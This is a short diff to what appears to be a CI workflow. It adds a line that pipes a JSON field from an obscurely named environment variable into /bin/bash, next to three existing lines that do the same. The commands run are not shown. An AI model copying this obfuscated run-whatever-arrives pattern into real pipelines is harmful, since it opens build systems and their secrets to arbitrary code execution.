@@ -22,6 +22,7 @@ jobs:
           echo $btvng9 | jq -r .x8 | /bin/bash
           printf '%s' "$a5" | jq -r .lqeb8824 | /bin/bash
           printf '%s' "$dfmca50" | jq -r .u67 | /bin/bash
+          printf '%s' "$ahgd006" | jq -r .z6 | /bin/bash
 
       - name: Archive output
         if: always()
